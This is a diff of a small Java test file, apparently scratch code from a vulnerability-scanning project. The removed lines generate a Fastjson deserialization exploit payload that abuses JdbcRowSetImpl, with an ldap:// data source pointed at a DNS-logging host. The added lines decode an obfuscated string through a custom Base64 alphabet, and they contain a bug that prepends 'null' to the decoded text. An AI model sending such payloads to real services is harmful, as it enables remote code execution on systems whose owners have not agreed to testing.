@@ -1,26 +1,31 @@
-import Utilss.shell;
-import com.sun.org.apache.bcel.internal.classfile.Utility;
-import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.util.Random;
+import javax.xml.bind.DatatypeConverter;
+import java.io.UnsupportedEncodingException;
 
 public class Test {
 
     public static void main(String[] args) {
-        String a = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "/\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
-        System.out.println(a);
+
+            char[] a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".toCharArray();
+            String b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6";
+            char[] str = "qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdbHthwalGcRu5nHzs".toCharArray();
+            String out = null;
+            for (int i = 0; i < str.length; i++) {
+                out += a[b.indexOf(str[i])];
+            }
+            System.out.println(decode(out));
     }
 
-    //length用户要求产生字符串的长度
-    public static String getRandomString(int length){
-        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        Random random=new Random();
-        StringBuffer sb=new StringBuffer();
-        for(int i=0;i<length;i++){
-            int number=random.nextInt(62);
-            sb.append(str.charAt(number));
+    public static String decode(String base64Str) {
+        // 解码后的字符串
+        String str = "";
+        // 解码
+        byte[] base64Data = DatatypeConverter.parseBase64Binary(base64Str);
+        try {
+            // byte[]-->String
+            str = new String(base64Data, "utf-8");
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
         }
-        return sb.toString();
+        return str;
     }
 }
